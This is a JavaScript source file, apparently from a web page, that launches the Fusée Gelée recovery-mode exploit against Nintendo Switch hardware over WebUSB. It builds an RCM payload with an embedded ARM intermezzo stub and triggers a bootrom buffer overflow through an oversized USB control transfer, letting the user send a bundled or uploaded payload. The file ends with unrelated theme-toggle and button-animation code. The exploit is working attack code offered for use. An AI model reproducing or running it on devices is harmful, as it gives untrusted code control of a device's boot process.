const intermezzo = new Uint8Array([
  0x44, 0x00, 0x9f, 0xe5, 0x01, 0x11, 0xa0, 0xe3, 0x40, 0x20, 0x9f, 0xe5, 0x00,
  0x20, 0x42, 0xe0, 0x08, 0x00, 0x00, 0xeb, 0x01, 0x01, 0xa0, 0xe3, 0x10, 0xff,
  0x2f, 0xe1, 0x00, 0x00, 0xa0, 0xe1, 0x2c, 0x00, 0x9f, 0xe5, 0x2c, 0x10, 0x9f,
  0xe5, 0x02, 0x28, 0xa0, 0xe3, 0x01, 0x00, 0x00, 0xeb, 0x20, 0x00, 0x9f, 0xe5,
  0x10, 0xff, 0x2f, 0xe1, 0x04, 0x30, 0x90, 0xe4, 0x04, 0x30, 0x81, 0xe4, 0x04,
  0x20, 0x52, 0xe2, 0xfb, 0xff, 0xff, 0x1a, 0x1e, 0xff, 0x2f, 0xe1, 0x20, 0xf0,
  0x01, 0x40, 0x5c, 0xf0, 0x01, 0x40, 0x00, 0x00, 0x02, 0x40, 0x00, 0x00, 0x01,
  0x40,
]);

const RCM_PAYLOAD_ADDRESS = 0x40010000;
const INTERMEZZO_LOCATION = 0x4001f000;
const PAYLOAD_LOAD_BLOCK = 0x40020000;

function createRCMPayload(intermezzo, payload) {
  const rcmLength = 0x30298;

  const intermezzoAddressRepeatCount =
    (INTERMEZZO_LOCATION - RCM_PAYLOAD_ADDRESS) / 4;

  const rcmPayloadSize =
    Math.ceil(
      (0x2a8 +
        0x4 * intermezzoAddressRepeatCount +
        0x1000 +
        payload.byteLength) /
        0x1000
    ) * 0x1000;

  const rcmPayload = new Uint8Array(new ArrayBuffer(rcmPayloadSize));
  const rcmPayloadView = new DataView(rcmPayload.buffer);

  rcmPayloadView.setUint32(0x0, rcmLength, true);

  for (let i = 0; i < intermezzoAddressRepeatCount; i++) {
    rcmPayloadView.setUint32(0x2a8 + i * 4, INTERMEZZO_LOCATION, true);
  }

  rcmPayload.set(intermezzo, 0x2a8 + 0x4 * intermezzoAddressRepeatCount);
  rcmPayload.set(payload, 0x2a8 + 0x4 * intermezzoAddressRepeatCount + 0x1000);

  return rcmPayload;
}

function bufferToHex(data) {
  let result = "";
  for (let i = 0; i < data.byteLength; i++)
    result += data.getUint8(i).toString(16).padStart(2, "0");
  return result;
}

async function write(device, data) {
  let length = data.length;
  let writeCount = 0;
  const packetSize = 0x1000;

  while (length) {
    const dataToTransmit = Math.min(length, packetSize);
    length -= dataToTransmit;

    const chunk = data.slice(0, dataToTransmit);
    data = data.slice(dataToTransmit);
    await device.transferOut(1, chunk);
    writeCount++;
  }

  return writeCount;
}

function readFileAsArrayBuffer(file) {
  return new Promise((res, rej) => {
    const reader = new FileReader();
    reader.onload = (e) => {
      res(e.target.result);
    };
    reader.readAsArrayBuffer(file);
  });
}

function logOutput(...message) {
  document.getElementById("output").value += message.join(" ") + "\n";
}

let device;

async function launchPayload(payload) {
  await device.open();
  logOutput(`Connected to ${device.manufacturerName} ${device.productName}`);

  await device.claimInterface(0);

  const deviceID = await device.transferIn(1, 16);
  logOutput(`Device ID: ${bufferToHex(deviceID.data)}`);

  const rcmPayload = createRCMPayload(intermezzo, payload);
  logOutput("Sending payload...");
  const writeCount = await write(device, rcmPayload);
  logOutput("Payload sent!");

  if (writeCount % 2 !== 1) {
    logOutput("Switching to higher buffer...");
    await device.transferOut(1, new ArrayBuffer(0x1000));
  }

  logOutput("Trigging vulnerability...");
  const vulnerabilityLength = 0x7000;
  const smash = await device.controlTransferIn(
    {
      requestType: "standard",
      recipient: "interface",
      request: 0x00,
      value: 0x00,
      index: 0x00,
    },
    vulnerabilityLength
  );
}

document.getElementById("goButton").addEventListener("click", async () => {
  logOutput("Requesting access to device...");
  device = await navigator.usb.requestDevice({
    filters: [{ vendorId: 0x0955 }],
  });

  const payloadType = document.forms.mainForm.payload.value;
  logOutput(`Preparing to launch ${payloadType}...`);

  let payload;
  if (payloadType === "fusee.bin") {
    payload = fusee;
  } else if (payloadType === "uploaded") {
    const file = document.getElementById("payloadUpload").files[0];
    if (!file) {
      alert("You need to upload a file, to use an uploaded file.");
      return;
    }
    payload = new Uint8Array(await readFileAsArrayBuffer(file));
  } else {
    console.log("how?");
    return;
  }

  launchPayload(payload);
});

document
  .getElementById("payloadUpload")
  .addEventListener(
    "change",
    () => (document.forms.mainForm.payload.value = "uploaded")
  );

function detectSystemTheme() {
  if (
    window.matchMedia &&
    window.matchMedia("(prefers-color-scheme: dark)").matches
  ) {
    return "dark";
  } else {
    return "light";
  }
}

function initializeTheme() {
  const savedTheme = localStorage.getItem("theme");
  const systemTheme = detectSystemTheme();

  if (savedTheme) {
    document.documentElement.setAttribute("data-theme", savedTheme);
    themeToggle.checked = savedTheme === "dark";
  } else {
    document.documentElement.setAttribute("data-theme", systemTheme);
    themeToggle.checked = systemTheme === "dark";
  }
}

const themeToggle = document.getElementById("themeToggle");

themeToggle.addEventListener("change", function () {
  const selectedTheme = this.checked ? "dark" : "light";
  document.documentElement.setAttribute("data-theme", selectedTheme);
  localStorage.setItem("theme", selectedTheme);
});

window.addEventListener("load", initializeTheme);

window
  .matchMedia("(prefers-color-scheme: dark)")
  .addEventListener("change", (e) => {
    const newTheme = e.matches ? "dark" : "light";
    document.documentElement.setAttribute("data-theme", newTheme);
    themeToggle.checked = newTheme === "dark";
    localStorage.setItem("theme", newTheme);
  });

const element = document.querySelector(".default, .success > div");

const d = 40;

document.querySelectorAll(".rocket-button").forEach((elem) => {
  elem.addEventListener("click", (e) => {
    e.preventDefault();
    if (elem.classList.contains("animated")) {
      return;
    }
    elem.classList.add("animated");
    elem.classList.toggle("live");
    setTimeout(() => {
      elem.classList.remove("animated");
    }, 2400);
  });
});
